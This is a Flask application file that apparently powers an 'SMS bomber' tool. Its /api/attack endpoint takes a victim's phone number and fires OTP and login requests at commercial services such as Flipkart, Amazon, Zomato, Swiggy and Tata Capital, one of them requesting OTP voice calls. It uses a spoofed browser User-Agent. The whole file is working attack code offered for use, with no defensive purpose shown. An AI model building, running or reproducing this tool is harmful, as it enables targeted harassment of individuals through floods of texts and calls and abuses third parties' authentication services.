# app.py
from flask import Flask, request, jsonify, render_template
import requests
import random
from apis import APIS

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/apis')
def get_apis():
    mode = request.args.get('mode', 'sms')
    return jsonify(APIS.get(mode, []))

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.json
    phone = data['phone']
    api = data['api']
    
    try:
        headers = api.get("headers", {})
        headers["User-Agent"] = "Mozilla/5.0"
        
        if api["method"] == "POST":
            payload = make_payload(phone, api["name"])
            res = requests.post(api["url"], json=payload, headers=headers, timeout=5)
        else:
            res = requests.get(api["url"] + phone, headers=headers, timeout=5)
            
        return jsonify({"success": res.status_code in [200, 201, 204]})
    except:
        return jsonify({"success": False})

def make_payload(phone, name):
    if "flipkart" in name.lower():
        return {"mobile": phone}
    elif "amazon" in name.lower():
        return {"phone": phone}
    elif "zomato" in name.lower():
        return {"country_code": "IN", "phone_number": phone}
    elif "swiggy" in name.lower():
        return {"mobile": phone}
    elif "pharmeasy" in name.lower():
        return {"mobile": phone}
    elif "1mg" in name.lower():
        return {"number": phone}
    elif "tata capital" in name.lower():
        return {"phone": phone, "isOtpViaCallAtLogin": "true"}
    else:
        return {"mobile": phone}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)